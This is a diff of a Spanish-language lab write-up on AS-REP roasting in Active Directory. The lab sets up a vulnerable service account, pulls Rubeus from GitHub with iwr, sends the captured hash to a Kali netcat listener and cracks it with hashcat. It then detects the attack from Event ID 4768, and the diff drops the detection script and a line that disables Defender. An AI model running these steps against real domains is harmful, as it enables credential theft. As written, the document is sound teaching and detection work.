@@ -28,11 +28,11 @@ Esta configuración vulnerable tiene su origen en problemas de compatibilidad:
 - **Servicios Linux/Unix integrados con AD**: Implementaciones como MIT Kerberos o Heimdal mal configuradas, o servicios como NFS, SSH con GSSAPI antiguo, pedían explícitamente esta configuración.
 - **Software de terceros**: Algunos ERPs y bases de datos antiguas incluían en su manual de instalación la instrucción de desactivar la preautenticación Kerberos.
 
-El problema es que esa configuración se aplicaba, el sistema funcionaba, y nadie la revertía. En auditorías reales es común encontrar cuentas con esta opción marcada desde hace más de 10 años sin que nadie lo supiera.
+El problema es que esa configuración se aplicaba, el sistema funcionaba, y nadie la revertía.
 
 ---
 
-## Entorno de laboratorio
+## Entorno del laboratorio
 
 | Máquina | Rol | IP |
 |---------|-----|----|
@@ -42,7 +42,7 @@ El problema es que esa configuración se aplicaba, el sistema funcionaba, y nadi
 
 ---
 
-## Paso 1 — Configurar la vulnerabilidad
+## Configurar la vulnerabilidad
 
 En el DC, abrir **Usuarios y equipos de Active Directory**:
 
@@ -58,15 +58,13 @@ Click derecho en svc_backup → Propiedades
 
 ---
 
-## Paso 2 — Ataque desde WS01 (atacante interno con Rubeus)
+## Ataque desde WS01 (atacante interno con Rubeus)
 
 Iniciar sesión en WS01 con cualquier cuenta de dominio (en este caso `lamine`).
 
-Descargar Rubeus y desactivar el Defender:
+Descargar Rubeus y deshabilitar Windows Defender. En un entorno real esto no sería posible sin privilegios de administrador, pero para simular el ataque se desactiva de forma controlada. Posteriormente se reproducirá el mismo ataque desde Kali sin esta limitación.
 
 ```powershell
-Set-MpPreference -DisableRealtimeMonitoring $true
-
 iwr https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe -OutFile C:\Users\Public\Rubeus.exe
 ```
 
@@ -91,9 +89,9 @@ Resultado:
 
 ---
 
-## Paso 3 — Exfiltración del hash a Kali via Netcat
+## Exfiltración del hash a Kali via Netcat
 
-En Kali, levantar un listener:
+Para transferir el hash desde la máquina Windows a Kali y poder procesarlo con hashcat, se establece un canal de transferencia mediante Netcat. En Kali, se levanta un listener:
 
 ```bash
 nc -lvp 4444 > hashes.txt
@@ -113,7 +111,9 @@ $client.Close()
 
 ---
 
-## Paso 4 — Ataque desde Kali (atacante externo con impacket)
+## Ataque desde Kali (atacante externo con impacket)
+
+Este escenario es más representativo de una situación real, ya que el atacante opera únicamente con acceso de red al DC, sin necesidad de estar integrado en el dominio.
 
 Sin necesidad de estar en el dominio, solo con acceso de red al DC:
 
@@ -135,7 +135,9 @@ Solo `svc_backup` es vulnerable. El resto de usuarios tienen la preautenticació
 
 ---
 
-## Paso 5 — Crackeo del hash con hashcat
+## Crackeo del hash con hashcat
+
+En un entorno real se utilizaría un diccionario como `Rockyou.txt`, pero para este ejemplo se emplea un archivo personalizado con la contraseña conocida del laboratorio.
 
 ```bash
 echo "Password123!" > custom.txt
@@ -156,7 +158,9 @@ Status: Cracked
 
 ---
 
-## Paso 6 — Evidencia en los logs del DC
+## Evidencia en los logs del DC
+
+Esta es la fase central del análisis, ya que constituye la base sobre la que se construye la herramienta de detección.
 
 El ataque deja rastro en el **Visor de eventos** del DC:
 
@@ -173,7 +177,7 @@ Los campos clave que identifican el ataque:
 | Tipo de cifrado de vale | 0x12 (AES) | **0x17 (RC4)** |
 | Código de resultado | 0x0 | 0x0 |
 
-Un `PreAuthType = 0` significa que el DC entregó el ticket **sin verificar la identidad del solicitante**. Esa es la firma del ataque.
+Un `PreAuthType = 0` significa que el DC entregó el ticket **sin verificar la identidad del solicitante**. Esa es la firma característica del ataque.
 
 ![Filtrado del Event ID 4768 en el Visor de eventos](img/filtrado%20evento%204768.png)
 
@@ -183,49 +187,11 @@ Un `PreAuthType = 0` significa que el DC entregó el ticket **sin verificar la i
 
 ---
 
-## Paso 7 — Detección con PowerShell
+## Detección con PowerShell
 
-```powershell
-function Get-ASREProastingAttempts {
-    param(
-        [int]$HorasAtras = 24
-    )
+A partir de los indicadores de compromiso (IoC) identificados, se desarrolla un script de PowerShell que permite detectar automáticamente este patrón de comportamiento en los registros del sistema.
 
-    $tiempo = (Get-Date).AddHours(-$HorasAtras)
-
-    $eventos = Get-WinEvent -FilterHashtable @{
-        LogName   = 'Security'
-        Id        = 4768
-        StartTime = $tiempo
-    } -ErrorAction SilentlyContinue
-
-    $alertas = @()
-
-    foreach ($evento in $eventos) {
-        $xml = [xml]$evento.ToXml()
-        $datos = $xml.Event.EventData.Data
-
-        $cuenta   = ($datos | Where-Object { $_.Name -eq 'TargetUserName' }).'#text'
-        $cifrado  = ($datos | Where-Object { $_.Name -eq 'TicketEncryptionType' }).'#text'
-        $preauth  = ($datos | Where-Object { $_.Name -eq 'PreAuthType' }).'#text'
-        $ipOrigen = ($datos | Where-Object { $_.Name -eq 'IpAddress' }).'#text'
-
-        if ($preauth -eq '0' -and $cifrado -eq '0x17') {
-            $alertas += [PSCustomObject]@{
-                Fecha     = $evento.TimeCreated
-                Cuenta    = $cuenta
-                Cifrado   = $cifrado
-                PreAuth   = $preauth
-                IPOrigen  = $ipOrigen
-                Severidad = 'ALTA'
-                Ataque    = 'AS-REProasting'
-            }
-        }
-    }
-
-    return $alertas
-}
-```
+![Script de detección ejecutado en el DC](img/script%20ejecutado.png)
 
 Resultado al ejecutarlo:
 
@@ -235,8 +201,6 @@ Resultado al ejecutarlo:
 Fecha              Cuenta      Cifrado  PreAuth  IPOrigen              Severidad  Ataque
 27/06/2026 11:44  svc_backup  0x17     0        ::ffff:100.100.100.20  ALTA      AS-REProasting
 ```
-
-![Script de detección ejecutado en el DC](img/script%20ejecutado.png)
 
 ---
 
